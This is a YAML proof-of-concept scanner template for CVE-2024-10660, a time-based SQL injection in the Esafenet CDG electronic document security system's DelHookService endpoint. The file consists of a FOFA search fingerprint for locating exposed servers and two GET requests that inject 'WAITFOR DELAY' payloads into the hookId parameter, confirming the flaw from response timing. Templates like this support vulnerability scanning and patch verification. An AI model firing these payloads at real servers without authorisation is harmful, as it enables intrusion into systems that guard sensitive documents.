id: poc-yaml-esafenet-hookid-sqli
info:
  name: 亿赛通CDG电子文档安全管理系统DelHookService存在sql注入漏洞(CVE-2024-10660)
  severity: high
  tags:
  - 两高一弱
  - sql-injection
  - CVE-2024-10660
  finger: 亿赛通电子文档安全管理系统
  fofa: body="/CDGServer3/index.jsp"
variables:
  t1: random_int(5,9)
  t2: t1 + 2
  t3: random_int(1,4)
  t4: t3 + 2
requests:
- method: GET
  path: /CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1';if(1=1)+WAITFOR+DELAY+'0:0:{{.t1}}'--
  expression: "status_code == 404 && \ncontains(body,\"Freedom LiFe\") &&\n(\n  contains(gbk_decode(body),\"\
    您访问的页面不存在\") || contains(body,\"您访问的页面不存在\") \n) &&\nduration >= t1 &&\nduration\
    \ <= t2\n"
- method: GET
  path: /CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1';if(1=1)+WAITFOR+DELAY+'0:0:{{.t3}}'--
  expression: "status_code == 404 && \ncontains(body,\"Freedom LiFe\") &&\n(\n  contains(gbk_decode(body),\"\
    您访问的页面不存在\") || contains(body,\"您访问的页面不存在\") \n) &&\nduration >= t3 &&\nduration\
    \ <= t4\n"
transport: http
